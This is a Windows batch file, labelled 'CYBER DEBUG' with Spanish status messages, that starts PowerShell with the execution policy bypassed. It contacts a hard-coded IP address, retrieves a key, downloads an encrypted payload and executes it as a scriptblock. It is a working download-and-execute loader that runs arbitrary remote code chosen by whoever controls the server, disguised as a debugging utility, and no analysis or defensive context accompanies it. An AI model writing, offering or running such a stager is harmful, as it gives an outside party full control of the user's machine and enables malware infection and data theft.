@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$ErrorActionPreference='Stop'; ^
Write-Host '==== CYBER DEBUG ====' -ForegroundColor Green; ^
$base='http://82.29.153.101:8080'; ^
Write-Host 'Conectando...'; ^
$health=Invoke-WebRequest ($base+'/health') -UseBasicParsing; ^
Write-Host ('Servidor OK: '+$health.StatusCode) -ForegroundColor Green; ^
$ts=[int](Get-Date -UFormat %s); ^
$keyResp=Invoke-WebRequest ($base+'/auth/key?ts='+$ts) -UseBasicParsing; ^
$key=$keyResp.Content.Trim(); ^
Write-Host ('Key OK: '+$key.Substring(0,10)+'...') -ForegroundColor Green; ^
$payload=Invoke-WebRequest ($base+'/payload/encrypted') -Headers @{ 'X-Decrypt-Key'=$key } -UseBasicParsing; ^
Write-Host 'Payload descargado' -ForegroundColor Green; ^
$sb=[scriptblock]::Create($payload.Content); ^
Write-Host 'Ejecutando...' -ForegroundColor Yellow; ^
& $sb; ^
Write-Host 'FIN' -ForegroundColor Green; ^
Read-Host 'ENTER para salir'"